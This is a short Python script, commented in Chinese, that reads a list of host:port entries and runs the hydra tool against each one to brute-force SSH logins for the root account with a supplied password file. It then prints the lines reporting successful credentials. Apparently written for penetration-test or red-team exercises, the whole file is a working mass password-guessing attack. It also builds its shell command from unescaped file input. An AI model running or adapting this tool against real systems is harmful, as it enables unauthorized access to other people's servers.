import sys
import subprocess

if __name__=="__main__":
    

    # 检查参数个数是否正确
    if len(sys.argv) != 3:
        print("Usage: python script.py  <数据文件>  <密码文件>")
        print("数据文件格式: <host>:<port>")
        print("密码文件格式: <password>")
        sys.exit(1)
        
        

    # 获取命令行参数
    data_file_path = sys.argv[1]
    password_file_path = sys.argv[2]

    # data_file_path = '/home/kali/work/hw2023/program/host.txt'
    # password_file_path = r'/home/kali/work/hw2023/program/pwd.txt'
    right_str='host:'
    list_login_right=[]
    lines = []
    with open(data_file_path, 'r') as file:
        for line in file:
            line=line.replace('\n', '')
            tmp_part= line.split(":")
            str_host=tmp_part[0]
            str_port=tmp_part[1]
            
            str_command='hydra -l root -I -P '+password_file_path+' -t 6 -vV '+str_host+' -s '+str_port+' ssh '
            shell_resopnse = subprocess.Popen(str_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            # 实时显示命令执行结果
            for line in shell_resopnse.stdout:
                print(line.strip('\n'))
                tmp_check=line.find("host:")
                if tmp_check!=-1:
                    list_login_right.append(line)
            # 等待命令执行完毕
            shell_resopnse.wait()
    print("------------------------执行完毕----------------------")
    print("执行结果：")
    print(list_login_right)
